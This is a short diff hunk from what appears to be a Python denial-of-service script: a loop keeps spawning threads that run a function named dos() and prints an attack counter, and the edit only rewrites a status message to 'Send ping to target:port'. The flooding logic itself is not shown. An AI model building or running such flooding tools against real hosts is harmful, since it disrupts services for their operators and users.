@@ -88,4 +88,4 @@ def dos():
 while True:
     threading.Thread(target=dos).start()
     print(f'Numbers of attack: {attack_num}')
-    print(colored("[!] sent %s Target: %s" % (sent, ip), 'yellow'))
+    print(f'Send ping to {target}:{port}')
